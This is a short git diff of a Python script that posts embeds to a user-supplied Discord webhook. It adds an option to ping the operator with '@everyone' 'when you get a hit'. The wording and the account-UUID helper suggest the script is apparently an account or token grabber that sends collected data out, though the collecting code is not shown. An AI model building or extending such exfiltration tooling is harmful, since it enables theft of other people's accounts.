@@ -5,8 +5,11 @@ import json
 import os
 from urllib.request import Request, urlopen
 
-# configuration
+# your webhook URL
 WEBHOOK_URL = "WEBHOOK HERE"
+
+# mentions you when you get a hit
+PING_ME = False
 
 def uuid_dashed(uuid):
     return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"
@@ -37,7 +40,7 @@ def main():
         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
     }
 
-    payload = json.dumps({"embeds": embeds})
+    payload = json.dumps({"embeds": embeds, "content": "@everyone" if PING_ME else ""})
     
     try:
         req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
